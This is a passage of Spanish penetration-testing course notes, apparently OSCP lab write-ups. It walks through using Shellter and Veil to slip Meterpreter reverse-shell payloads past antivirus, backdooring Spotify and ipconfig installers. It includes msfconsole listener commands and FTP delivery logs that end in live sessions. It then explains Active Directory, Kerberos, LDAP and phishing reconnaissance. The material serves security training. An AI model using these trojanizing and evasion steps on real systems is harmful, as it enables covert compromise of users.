Una vez hemos cambiado el nombre de ciertas variables hemos engañado a la lógica de predicción del engine de AV y hemos bypasseado el antivirus.

Antes de terminar recordar que en muchas ocasiones Windows tiene habilitada una medida de protección contra la ejecución de scripts.

<br />

**Automating the process (Shellter)**

En la sección anterior hemos construido manualmente a partir de un script de powershell una ofuscación de una shellcode que nos ha permitido engañar al antivirus de turno. Con frecuencia esto no se encuentra al alcance de nuestras posibilidades por lo que nos vemos forzados a utilizar una herramienta que automatice el proceso, lo ideal es investigar el tipo de software AV que el target tiene instalado en la máquina e instalarlo en un entorno simulado siempre que sea posible para testearlo con diferentes payloads. 

Una herramienta conocida es [Shellter](https://github.com/ParrotSec/shellter) un dynamic shellcode injection tool capaz de bypassear un software antivirus. Si bien los detalles de las técnicas que usa Shellter están más allá del alcance de este módulo, esencialmente realiza un análisis exhaustivo del archivo PE de destino y las rutas de ejecución. Luego determina dónde puede inyectar nuestro shellcode sin depender de las técnicas de inyección tradicionales que los motores AV detectan fácilmente.

Realizamos un update/upgrade y descargamos shellter y wine:

```bash
sudo apt install shellter; sudo apt install wine; sudo dpkg --add-architecture i386 && sudo apt-get update -y && sudo apt-get install wine32 -y
```

Seguidamente abrimos una terminal de shellter con:

```
sudo shellter
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230425124209.png' | relative_url }}" text-align="center"/>
</div>

Shellter puede ejecutarse en modo _automático_ o _manual_ . En el modo Manual, la herramienta lanzará el PE que queremos usar para la inyección y nos permitirá manipularlo en un nivel más granular. Podemos usar este modo para personalizar mucho el proceso de inyección en caso de que las opciones seleccionadas automáticamente fallen. Sin embargo, nuestra primera preferencia será utilizar el modo automático.

Una vez seleccionamos el modo automático se nos pedirá el path del ejecutable sobre el que inyectar el payload. En este caso estaremos utilizando un ejectuable de Spotify (para un caso de pentesting real se recomienda emplear un ejecutable preferentemente nuevo, ya que estos están menos testeados)

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230425132751.png' | relative_url }}" text-align="center"/>
</div>

Tan pronto como Shellter encuentre un lugar adecuado para inyectar nuestro payload, nos preguntará si queremos habilitar *Stealth Mode*, que intentará restaurar el flujo de ejecución del PE después de que se haya ejecutado nuestro payload. Habilitemos Stealth Mode como nos gustaría que el instalador de Spotify se comportara normalmente para evitar cualquier sospecha.

En este punto, se nos presenta la lista de payloads disponibles. Estos incluyen selecciones populares como Meterpreter, pero Shellter también admite cargas útiles personalizadas.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230425133421.png' | relative_url }}" text-align="center"/>
</div>

Tenga en cuenta que para restaurar el flujo de ejecución a través de la opción Stealth Mode, los payloads personalizadas deben terminar saliendo del subproceso actual.

Después de algunas pruebas, parece que cualquier carga útil que no sea de Meterpreter no se ejecuta correctamente en Windows 11 y, por lo tanto, tendremos que recurrir a las cargas útiles basadas en Meterpreter.

En esta etapa, no debemos preocuparnos demasiado por las diferencias entre los payloads estándar y de Meterpreter, ya que aprenderemos sobre ellas en un módulo próximo.

Para probar las capacidades de derivación de Shellter, utilizaremos el payload de Meterpreter_Reverse_TCP que Avira detectó al comienzo de este módulo. Después de escribir **L** para elegir los payloads enumeradas, seleccionaremos el primer payload. Luego se nos presentan las opciones predeterminadas de Metasploit, como el host de shell inverso (LHOST) y el puerto (LPORT), que debemos completar con la dirección IP y el puerto de escucha de nuestro Kali local.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230425200439.png' | relative_url }}" text-align="center"/>
</div>

Con todos los parámetros establecidos, Shellter inyectará la carga útil en el instalador de Spotify e intentará llegar a la primera instrucción de la carga útil.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230425200502.png' | relative_url }}" text-align="center"/>
</div>

Ahora que la prueba ha tenido éxito, antes de transferir el archivo PE malicioso a nuestro cliente de Windows, configuraremos un listener en nuestra máquina Kali para interactuar con el payload de Meterpreter. Podemos lograr esto con la siguiente línea, recordando reemplazar la dirección IP con la de nuestra caja Kali.

```
kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
```

<br />

**Exercises**

**1.  Use Shellter to inject a Meterpreter reverse shell payload in the Spotify executable, then transfer the binary to your Window 11 client VM #1 and ensure that it is not being detected by the antivirus. After, set up a Meterpreter listener, run the backdoored Spotify installer, and verify that you have obtained an interactive shell. As an additional exercise, attempt to find different executables and inject malicious code into them using Shellter.**

En primer lugar debemos conectarnos a la máquina de Windows con rdesktop y transportar el archivo 'spotifysetup.exe'. Creamos un directorio llamado Windows y empleamos el siguiente comando:

```
$ rdesktop 10.20.30.40 -r disk:linux=/home/kali/windows
```

Seguidamente, en nuestro cliente linux, acudimos a Network > tsclient > \\\\tsclient\\linux que nos dará acceso a nuestra carpeta /home/kali/windows y copiamos el fichero C:\\Users\\Offsec\\spotifysetup.exe

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230425212636.png' | relative_url }}" text-align="center"/>
</div>

Ahora utilizamos shellter como en el ejemplo descrito en la teoría y lo devolvemos a la máquina, activamos un listener con metasploit:

```
kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

Y devolvemos el ejecutable a la máquina:

```
$ rdesktop 10.20.30.40 -r disk:linux=/home/kali/windows
```

Y lo ejecutamos, podemos ver que por un lado hemos obtenido una shell pero además, la funcionalidad del ejecutable sigue intacta:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230425223025.png' | relative_url }}" text-align="center"/>
</div>

Y el antivirus no lo ha detectado.

<br />

**2.Capstone Exercise: In this exercise, you'll be facing off against _COMODO_ antivirus engine running on Module Exercise VM #1. Use another popular 32-bit application, like _PuTTY_, to replicate the steps learned so far in order to inject malicious code in the binary with Shellter. The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing .exe file(s) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell. NOTE: set the FTP session as _active_ and enable _binary_ encoding while transferring the file.**

En primer lugar, escaneamos la máquina con Nmap y efectivamente confirmamos que tiene un servidor web y un servidor FTP.

El servidor FTP permite un logeo anonimo que posee permisos de escritura y lectura. Por el enunciado sabemso que existe un antivirus que bypassear y que un usuario va a clickear sobre cualquier ejecutable que encuentre.

Así, empleamos primero el ejecutable 'ipconfig.exe':

```
kali@kali:~/OSCP$ cp /usr/lib/i386-linux-gnu/wine/i386-windows/ipconfig.exe .
```

Y utilizamos Shellter sobre él y utilizamos un payload meterpreter reverse tcp stager (disponible por el propio Shellter). Seguidamente, activamos un multi/handler con el paylaod adecuado

```
kali@kali:~$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444; run" 
```

Y subimos el fichero al servidor FTP:

```
kali@kali:~/OSCP$ ftp anonymous@192.168.187.53
Connected to 192.168.187.53.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> binary
200 Type set to I.
ftp> put ipconfig.exe
local: ipconfig.exe remote: ipconfig.exe
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************|   126 KiB    1.30 MiB/s    00:00 ETA
226 Transfer complete.
129292 bytes sent in 00:00 (997.54 KiB/s)
ftp> 
```

Observemos que hemos deshabiltiado el modo pasivo y activado el modo binario.

Seguidamente, recibiremos una conexión con una reverse shell:

```
[...]
Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command
Metasploit Documentation: https://docs.metasploit.com/

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => tun0
LPORT => 4444
[*] Started reverse TCP handler on 192.168.45.194:4444 
[*] Sending stage (175686 bytes) to 192.168.187.53
[*] Meterpreter session 1 opened (192.168.45.194:4444 -> 192.168.187.53:49469) at 2023-06-30 07:02:40 -0400

meterpreter > 
```

<br />

**3. Capstone Exercise: Similar to the previous exercise, you'll be facing off against _COMODO_ antivirus engine v12.2.2.8012 on Module Exercise VM #2. Although the PowerShell AV bypass we covered in this Module is substantial, it has an inherent limitation. The malicious script cannot be _double-clicked_ by the user for an immediate execution. Instead, it would open in _notepad.exe_ or another default text editor. The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another open-source framework to help us automate this process. Research how to install and use the [_Veil_](https://github.com/Veil-Framework/Veil) framework to help you with this exercise.**

**The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing Windows batch script file(s) (.bat) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell.**

En primer lugar instalamos Veil:

```
sudo apt-get install update -y; sudo apt-get install upgrade -y; sudo apt-get install veil -y
```

Seguidamente, usamos veil para crear un archivo bat que se genera utilizando un payload de powershell:

```  
kali@kali:~$ veil                                                                                                    
===============================================================================
                             Veil | [Version]: 3.1.14
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Main Menu

        2 tools loaded

Available Tools:

        1)      Evasion
        2)      Ordnance

Available Commands:

        exit                    Completely exit Veil
        info                    Information on a specific tool
        list                    List available tools
        options                 Show Veil configuration
        update                  Update Veil
        use                     Use a specific tool

Veil>: use 1
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Veil-Evasion Menu

        41 payloads loaded

Available Commands:

        back                    Go to Veil's main menu
        checkvt                 Check VirusTotal.com against generated hashes
        clean                   Remove generated artifacts
        exit                    Completely exit Veil
        info                    Information on a specific payload
        list                    List available payloads
        use                     Use a specific payload
Veil/Evasion>: lis
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================


 [*] Available Payloads:                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
        1)      autoit/shellcode_inject/flat.py

        2)      auxiliary/coldwar_wrapper.py
        3)      auxiliary/macro_converter.py
        4)      auxiliary/pyinstaller_wrapper.py

        5)      c/meterpreter/rev_http.py
        6)      c/meterpreter/rev_http_service.py
        7)      c/meterpreter/rev_tcp.py
        8)      c/meterpreter/rev_tcp_service.py

        9)      cs/meterpreter/rev_http.py
        10)     cs/meterpreter/rev_https.py
        11)     cs/meterpreter/rev_tcp.py
        12)     cs/shellcode_inject/base64.py
        13)     cs/shellcode_inject/virtual.py

        14)     go/meterpreter/rev_http.py
        15)     go/meterpreter/rev_https.py
        16)     go/meterpreter/rev_tcp.py
        17)     go/shellcode_inject/virtual.py

        18)     lua/shellcode_inject/flat.py

        19)     perl/shellcode_inject/flat.py

        20)     powershell/meterpreter/rev_http.py
        21)     powershell/meterpreter/rev_https.py
        22)     powershell/meterpreter/rev_tcp.py
        23)     powershell/shellcode_inject/psexec_virtual.py
        24)     powershell/shellcode_inject/virtual.py

        25)     python/meterpreter/bind_tcp.py
        26)     python/meterpreter/rev_http.py
        27)     python/meterpreter/rev_https.py
        28)     python/meterpreter/rev_tcp.py
        29)     python/shellcode_inject/aes_encrypt.py
        30)     python/shellcode_inject/arc_encrypt.py
        31)     python/shellcode_inject/base64_substitution.py
        32)     python/shellcode_inject/des_encrypt.py
        33)     python/shellcode_inject/flat.py
        34)     python/shellcode_inject/letter_substitution.py
        35)     python/shellcode_inject/pidinject.py
        36)     python/shellcode_inject/stallion.py

        37)     ruby/meterpreter/rev_http.py
        38)     ruby/meterpreter/rev_https.py
        39)     ruby/meterpreter/rev_tcp.py
        40)     ruby/shellcode_inject/base64.py
        41)     ruby/shellcode_inject/flat.py
Veil/Evasion>: use 22
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 Payload Information:
                                                                                                                                                                                                                                            
        Name:           Pure PowerShell Reverse TCP Stager
        Language:       powershell
        Rating:         Excellent
        Description:    pure windows/meterpreter/reverse_tcp stager, no
                        shellcode

Payload: powershell/meterpreter/rev_tcp selected

 Required Options:
                                                                                                                                                                                                                                            
Name                    Value           Description
----                    -----           -----------
BADMACS                 FALSE           Checks for known bad mac addresses
DOMAIN                  X               Optional: Required internal domain
HOSTNAME                X               Optional: Required system hostname
LHOST                                   IP of the Metasploit handler
LPORT                   4444            Port of the Metasploit handler
MINBROWSERS             FALSE           Minimum of 2 browsers
MINPROCESSES            X               Minimum number of processes running
MINRAM                  FALSE           Require a minimum of 3 gigs of RAM
PROCESSORS              X               Optional: Minimum number of processors
SLEEP                   X               Optional: Sleep "Y" seconds, check if accelerated
USERNAME                X               Optional: The required user account
USERPROMPT              FALSE           Window pops up prior to payload
UTCCHECK                FALSE           Check that system isn't using UTC time zone
VIRTUALPROC             FALSE           Check for known VM processes

 Available Commands:
                                                                                                                                                                                                                                            
        back            Go back to Veil-Evasion
        exit            Completely exit Veil
        generate        Generate the payload
        options         Show the shellcode's options
        set             Set shellcode option

[powershell/meterpreter/rev_tcp>>]: set LHOST 192.168.45.218
[powershell/meterpreter/rev_tcp>>]: generate
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [>] Please enter the base name for output files (default is payload): 
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/payload.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc

Hit enter to continue...
```

Seguidamente, seteamos un multi/handler:

```
msfconsole -x "use multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444; run"
```

Y colocamos el payload en el servidor FTP y epseramos recibir la conexión:

```
kali@kali:~$ ftp anonymous@192.168.218.53
Connected to 192.168.218.53.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> binary
200 Type set to I.
ftp> put /var/lib/veil/output/source/payload.bat payload.bat
local: /var/lib/veil/output/source/payload.bat remote: payload.bat
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  2295       30.39 MiB/s    00:00 ETA
226 Transfer complete.
2295 bytes sent in 00:00 (70.08 KiB/s)
ftp>
```

<br />

```
[...]
Metasploit tip: Start commands with a space to avoid saving 
them to history
Metasploit Documentation: https://docs.metasploit.com/

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => tun0
LPORT => 4444
[*] Started reverse TCP handler on 192.168.45.218:4444 
[*] Sending stage (175686 bytes) to 192.168.218.53
[*] Meterpreter session 1 opened (192.168.45.218:4444 -> 192.168.218.53:49884) at 2023-06-30 13:09:32 -0400

meterpreter >
```

### 5. Introduction to Active Directory.

#### 5.1. Active Directory Introduction.

**Conceptos importantes de AD**

El propósito de los *Active Directory Domain Services* (ADDS), comúnmente llamado Active Directory, es proporcionar un marco escalable y centralizado de administración, autenticación y autorización de TI.

La mayoría de las organizaciones y empresas más grandes emplean Active Directory como el núcleo de su infraestructura de TI. Debido a la prevalencia de Active Directory, todos los profesionales de seguridad de TI deben tener un buen conocimiento fundamental de cómo funciona y sus componentes.

Active Directory está organizado en torno a un dominio principal, como _demo.com_ . Este suele ser el nombre de la empresa. El componente de más alto nivel de Active Directory se denomina *Forest* que es autónomo y proporciona todos los servicios necesarios.

Es posible tener subdominios asociados en Active Directory, como *sub.demo.com*, en *Dominios* contenidos bajo el Forest. En este tema, nos centraremos en la forma más simple de Active Directory que no contiene ningún subdominio.

El elemento principal de Active Directory es el *Domain Controller* DC o Controlador de Dominios. Almacena toda la información relevante para el bosque y proporciona todos los servicios clave de autenticación y autorización. Además, también contiene todos los servicios de gestión básicos y nativos.

Un bosque generalmente contiene varios dominios para permitir la redundancia de datos y servicios. A su vez, cada dominio suele contener varios DCs. Todos los controladores de dominio replicarán los datos de Active Directory entre ellos para permitir que cada uno de ellos realice la mayoría de los servicios y evitar así problemas de saturación.

Además de los controladores de dominio, Active Directory generalmente contiene una multitud de servidores y clientes de Windows. Estas máquinas normalmente se conocen como *domain-joined*. Los controladores de dominio contienen servicios para proporcionar autenticación y autorización a las computadoras y los servicios que se ejecutan en ellas.

También es posible tener equipos Linux que sean miembros de un dominio. Sin embargo, la inclusión de máquinas Linux en un dominio no está muy extendida y no proporciona el mismo nivel de gestión.

El principal protocolo de red utilizado para facilitar tanto la autenticación como la autorización en Active Directory se denomina *Kerberos*.

El protocolo de autenticación Kerberos actual, utilizado por Microsoft, se adopta del protocolo de autenticación Kerberos versión 5 creado por MIT y se ha utilizado como mecanismo de autenticación principal de Microsoft desde Windows Server 2003.

En un alto nivel, la autenticación del cliente Kerberos a un servicio en Active Directory implica el uso de un controlador de dominio en el papel de un *Centro de distribución de claves* o *KDC* y utiliza un sistema de *tickets*. Este proceso se ilustra a continuación:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230203124216.png' | relative_url }}" text-align="center"/>
</div>

Revisemos este proceso en detalle. Primero, cuando un usuario inicia sesión en su estación de trabajo, se envía una *solicitud de autenticación del servidor* (AS_REQ) al controlador de dominio. El controlador de dominio, que actúa como KDC, también mantiene el servicio del servidor de autenticación. El AS_REQ contiene una marca de tiempo que se cifra mediante un hash derivado de la contraseña del usuario y su nombre de usuario.

Cuando el controlador de dominio recibe la solicitud, busca el hash de contraseña asociado con el usuario específico e intenta descifrar la marca de tiempo. Si el proceso de descifrado es exitoso y la marca de tiempo no es un duplicado, la autenticación se considera exitosa.

Si la marca de tiempo es un duplicado, podría indicar evidencia de un posible ataque de reproducción.

A continuación, el controlador de dominio responde al cliente con una respuesta del *servidor de autenticación* (AS_REP). Dado que Kerberos es un protocolo sin estado, AS_REP contiene una *clave de sesión* y un vale de concesión de vales (TGT). La clave de sesión se cifra utilizando el hash de la contraseña del usuario y el cliente puede descifrarla y luego reutilizarla. El TGT contiene información sobre el usuario, el dominio, una marca de tiempo, la dirección IP del cliente y la clave de sesión.

Para evitar la manipulación, el Ticket de concesión de tickets se cifra con una clave secreta que solo conoce el KDC y el cliente no puede descifrar. Una vez que el cliente ha recibido la clave de sesión y el TGT, el KDC considera completa la autenticación del cliente. Por defecto, el TGT tendrá una vigencia de 10 horas, luego de lo cual se produce una renovación. Esta renovación no requiere que el usuario vuelva a ingresar su contraseña.

Cuando el usuario desea acceder a los recursos del dominio, como un recurso compartido de red o un buzón, debe comunicarse nuevamente con el KDC.

Esta vez, el cliente construye un paquete _de solicitud de servicio de concesión de tickets_ (TGS_REQ) que consta del usuario actual y una marca de tiempo cifrada con la clave de sesión, el nombre del recurso y el TGT cifrado.

A continuación, el servicio de otorgamiento de tickets en el KDC recibe el TGS_REQ y, si el recurso existe en el dominio, el TGT se descifra utilizando la clave secreta que solo conoce el KDC. Luego, la clave de sesión se extrae del TGT y se usa para descifrar el nombre de usuario y la marca de tiempo de la solicitud. En este punto, el KDC realiza varias comprobaciones:

1.  El TGT debe tener una marca de tiempo válida.
2.  El nombre de usuario de TGS_REQ tiene que coincidir con el nombre de usuario de TGT.
3.  La dirección IP del cliente debe coincidir con la dirección IP de TGT.

Si este proceso de verificación tiene éxito, el servicio de otorgamiento de vales responde al cliente con una respuesta del _servidor_ de otorgamiento de vales (TGS_REP). Este paquete contiene tres partes:

1.  El nombre del servicio para el que se ha concedido acceso.
2.  Una clave de sesión que se utilizará entre el cliente y el servicio.
3.  Un _ticket de servicio que_ contiene el nombre de usuario y las pertenencias a grupos junto con la clave de sesión recién creada.

El nombre de servicio y la clave de sesión del ticket de servicio se cifran utilizando la clave de sesión original asociada con la creación del TGT. El ticket de servicio se cifra utilizando el hash de contraseña de la cuenta de servicio registrada con el servicio en cuestión.

Una vez que se completa el proceso de autenticación por parte del KDC y el cliente tiene una clave de sesión y un ticket de servicio, comienza la autenticación del servicio.

Primero, el cliente envía al servidor de _aplicaciones una solicitud_ de aplicación (AP_REQ), que incluye el nombre de usuario y una marca de tiempo cifrada con la clave de sesión asociada con el ticket de servicio junto con el propio ticket de servicio.

El servidor de aplicaciones descifra el ticket de servicio utilizando el hash de la contraseña de la cuenta de servicio y extrae el nombre de usuario y la clave de sesión. Luego usa este último para descifrar el nombre de usuario del _AP_REQ_ . Si el nombre de usuario _AP_REQ_ coincide con el descifrado del ticket de servicio, se acepta la solicitud. Antes de que se conceda el acceso, el servicio inspecciona las pertenencias a grupos proporcionadas en el ticket de servicio y asigna los permisos apropiados al usuario, después de lo cual el usuario puede acceder al servicio solicitado.

Este protocolo puede parecer complicado e incluso enrevesado, pero fue diseñado para mitigar varios ataques a la red y evitar el uso de credenciales falsas.

Mientras que el protocolo Kerberos maneja tanto la autenticación como la autorización, _el Protocolo ligero de acceso a directorios_ (LDAP) se usa muy comúnmente para interactuar con los controladores de dominio para enviar o recuperar datos.

LDAP es un protocolo de código abierto diseñado para interactuar con los servicios de directorio. También es fácil interactuar con LDAP desde un lenguaje de secuencias de comandos como PowerShell.

<br />

#### 5.2. LDAP.

LDAP es la abreviatura de "Lightweight Directory Access Protocol", se trata de un protocolo que actúa como servicio a nivel interno y externo el cual facilita la localización de objetos (usuarios, grupos, etc) dentro de una red. Es frecuentemente utilizado en hosts de Windows para gestionar el acceso a información en una red de Active Directory. Se trata de una versión ligera del protocolo DAP diseñado con la misma función.

Los servidores LDAP reciben el nombre de LDAP directory, los cuales pueden estar distribuidos entre diversos hosts. Estos servidores se actualizan y sincronizan periódicamente.

Cada LDAP directory tiene organizada la información a través de una estructura jerárquica:

- Root directory.
- Countries.
- Organizations.
- Organizational Units
- Individuals.

La información final de cada tipo se encuentra en el directorio Individuals y cada directorio está contenido en el anterior. El formato de la información viene representado por registros por LDIF (LDAP Data Interchange Format) que también representa *update requests*:

```
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```

El servicio LDAP escucha en los puertos 389 y 636 por defecto:

```
PORT     STATE  SERVICE    REASON
389/tcp  open   ldap       syn-ack
636/tcp  open   tcpwrapped
```

Si tenemos un servidor LDAP que escucha peticiones externas, podemos intentar realizar lo que se conoce como un anonymous LDAP bind login para extraer información de Active Directory. 

<br />

### 6. Client-side Attacks.

En las pruebas de penetración, un cliente puede pedirnos que rompamos el perímetro de su empresa y obtengamos un punto de apoyo inicial dentro de la red. Con el modelo de ataque tradicional, enumeraríamos las máquinas accesibles del cliente e intentaríamos explotar sus servicios. Sin embargo, superar el perímetro explotando vulnerabilidades técnicas se ha vuelto cada vez más raro y difícil según un informe de _Verizon_ .  El informe establece que _Phishing_ es el segundo vector de ataque más grande utilizado para violar un perímetro, solo superado por los ataques de credenciales.

El phishing a menudo aprovecha los ataques del lado del cliente. Este tipo de ataque funciona difundiendo archivos maliciosos directamente a los usuarios. Una vez que ejecutan estos archivos en su máquina, podemos afianzarnos en la red interna. Los ataques del lado del cliente a menudo aprovechan las debilidades o las funciones del software y las aplicaciones locales, como los navegadores, los componentes del sistema operativo o los programas de oficina. Para ejecutar código malicioso en el sistema del cliente, a menudo debemos persuadir, engañar o engañar al usuario objetivo.

Este concepto de engaño es importante para que lo consideremos como probadores de penetración. Plantea la pregunta, ¿ _a quién_ estamos engañando exactamente? ¿A quién estamos tratando de persuadir? Los ataques del lado del cliente nos brindan la oportunidad de contemplar las vulnerabilidades, los sesgos y la fragilidad inherentes a _las personas_ , y no solo a las computadoras o las redes. Esto implica que para convertirnos en los mejores atacantes posibles no solo debemos ser expertos en habilidades técnicas como administración de sistemas y redes (por ejemplo), sino también desarrollar conocimientos sobre psicología humana, cultura corporativa y normas sociales.

Cuando aprovechamos los ataques del lado del cliente en las pruebas de penetración, también debemos considerar el aspecto moral de apuntar a los usuarios. Nuestro objetivo no debe ser solo obtener la ejecución del código en su sistema, sino también no traspasar ningún límite ético o legal, como chantajear a los empleados o hacerse pasar por la policía.

Dado que la máquina del cliente en una red empresarial interna no suele ser un sistema al que se pueda acceder directamente, y dado que no suele ofrecer servicios expuestos externamente, este tipo de vector de ataque es difícil de mitigar y especialmente insidioso. Este tipo de ataques ha fomentado la implementación de nuevos paradigmas de defensa.

Los ataques del lado del cliente a menudo usan mecanismos de entrega específicos y combinaciones de carga útil, incluidos archivos adjuntos de correo electrónico o enlaces a sitios web o archivos maliciosos. Incluso podríamos aprovechar mecanismos de entrega más avanzados, como _USB Dropping_ o _ataques de abrevadero_ .

Independientemente del mecanismo de entrega que elijamos, a menudo debemos entregar nuestro payload a un objetivo en una red interna no enrutable, ya que los sistemas de los clientes rara vez están expuestos externamente.

Se ha vuelto cada vez más difícil entregar cargas útiles por correo electrónico debido a los filtros de spam, firewalls y otras tecnologías de seguridad que analizan los correos electrónicos en busca de enlaces y archivos adjuntos.

Al elegir un vector de ataque y una carga útil, primero debemos realizar un reconocimiento para determinar el sistema operativo del objetivo, así como las aplicaciones instaladas. Este es un primer paso crítico, ya que nuestra carga útil debe coincidir con la capacidad del objetivo. Por ejemplo, si el objetivo está ejecutando el sistema operativo Windows, podemos usar una variedad de ataques del lado del cliente, como el código malicioso _JScript_ ejecutado a través de _Windows Script Host_ o archivos de acceso directo _.lnk_ que apuntan a recursos maliciosos. Si el objetivo ha instalado Microsoft Office, podríamos aprovechar documentos con macros maliciosas incrustadas.

En este módulo, aprenderemos cómo realizar reconocimiento contra un objetivo, recorrer escenarios de explotación que involucran documentos maliciosos de Microsoft Office y aprovechar los _archivos de la biblioteca de Windows_ .

<br />

#### 6.1. Target Reconnaissance.

Antes de ejecutar un ataque del lado del cliente, es crucial que identifiquemos a los usuarios potenciales para atacar y recopilar la mayor cantidad de información detallada posible sobre su sistema operativo y el software de aplicación instalado. Esto nos ayuda a mejorar nuestras posibilidades de un ataque exitoso. Podemos identificar a estos usuarios navegando por el sitio web de la empresa y buscando puntos de contacto o utilizando técnicas pasivas de recopilación de información para encontrar empleados en las redes sociales.

A diferencia del reconocimiento de red tradicional realizado contra un sistema objetivo, a menudo no tenemos una conexión directa con el objetivo de un ataque del lado del cliente. En su lugar, debemos utilizar un enfoque más personalizado y creativo.

En esta unidad de aprendizaje, exploraremos estas técnicas únicas de recopilación de información y discutiremos los vectores de ingeniería social diseñados para enumerar de manera efectiva los detalles del sistema de destino.

<br />

**Information Gathering. Metadata**

En esta sección, discutiremos varios métodos para enumerar el software instalado de un destino sin interactuar con la máquina de destino. Estas técnicas son más adecuadas para situaciones en las que no tenemos forma de interactuar con el objetivo. Dado que no estamos interactuando con el objetivo, no alertaremos a los sistemas de monitoreo ni dejaremos rastros forenses de nuestra investigación.

Un enfoque consiste en inspeccionar las _etiquetas de metadatos_ de los documentos disponibles públicamente asociados con la organización de destino. Aunque estos datos se pueden desinfectar manualmente, a menudo no es así. Estas etiquetas (clasificadas por _grupos de etiquetas_ ) pueden incluir una variedad de información sobre un documento, incluido el autor, la fecha de creación, el nombre y la versión del software utilizado para crear el documento, el sistema operativo del cliente y mucho más.

En algunos casos, esta información se almacena explícitamente en los metadatos, y en algunos casos se infiere, pero de cualquier manera la información puede ser bastante reveladora, ayudándonos a construir un perfil preciso del software instalado en los clientes de una organización objetivo. Tenga en cuenta que nuestros hallazgos pueden estar desactualizados si estamos inspeccionando documentos más antiguos. Además, las diferentes ramas de la organización pueden usar software ligeramente diferente.

Aunque este es un enfoque de "no intervención" para la recopilación de datos, la contrapartida es que es posible que no recopilemos información precisa. Aún así, este enfoque es viable y efectivo.

Revisemos algunos documentos de muestra para que podamos demostrar el análisis de metadatos.

Aprovecharemos algunas de las técnicas que aprendimos en el Módulo de recopilación de información. Por ejemplo, podemos usar el **sitio: ejemplo.com tipo de archivo: pdf** Google dork para encontrar archivos PDF en la página web de un objetivo. Si queremos apuntar a una sucursal o ubicación específica, podemos agregar esa información a través de palabras clave para limitar los resultados.

Si queremos interactuar con el sitio web del objetivo, también podemos usar herramientas como _gobuster_ con el parámetro **-x** para buscar extensiones de archivo específicas en el sitio web del objetivo. Esto es ruidoso y generará entradas de registro en el destino. También podemos simplemente navegar por el sitio web objetivo en busca de otra información específica útil en un ataque del lado del cliente, pero no profundizaremos en ese tema en esta sección.

Practiquemos la búsqueda y recuperación de documentos del sitio web _de Mountain Vegetables_ . Abriremos Firefox y navegaremos a **http://192.168.50.197** .

Para mostrar los metadatos de cualquier _archivo compatible_ , podemos usar _exiftool_.

Esto generó una gran cantidad de salida. Para nosotros, la información más importante incluye la fecha de creación del archivo, la fecha de última modificación, el nombre del autor, el sistema operativo y la aplicación utilizada para crear el archivo.

